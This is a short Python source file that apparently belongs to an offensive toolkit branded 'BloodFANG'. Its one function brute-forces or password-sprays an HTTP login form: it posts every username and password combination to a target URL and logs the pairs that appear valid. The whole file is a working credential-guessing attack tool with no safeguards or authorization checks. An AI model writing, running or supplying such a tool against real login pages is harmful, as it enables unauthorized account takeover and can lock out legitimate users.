import requests
from itertools import product

def password_spray(url, username_list, password_list, login_path, logger=print):
    """
    Basic HTTP form brute force / password spray.
    url: base url (e.g., http://target.com)
    username_list: list of usernames to try
    password_list: list of passwords to try
    login_path: path to login form (e.g., /login)
    logger: logging function to capture output
    """

    login_url = url.rstrip("/") + login_path

    headers = {"User-Agent": "BloodFANG-BruteForce"}
    logger(f"[>] Starting password spray on {login_url}")

    for username, password in product(username_list, password_list):
        data = {"username": username, "password": password}  # Adjust keys if needed
        try:
            r = requests.post(login_url, data=data, headers=headers, timeout=10)
            # Naive success check: status code 200 and no "invalid" in response
            if r.status_code == 200 and "invalid" not in r.text.lower():
                logger(f"[!!] Possible valid creds found - {username}:{password}")
            else:
                logger(f"[-] Tried {username}:{password} - failed")
        except Exception as e:
            logger(f"[X] Error on {username}:{password} - {e}")
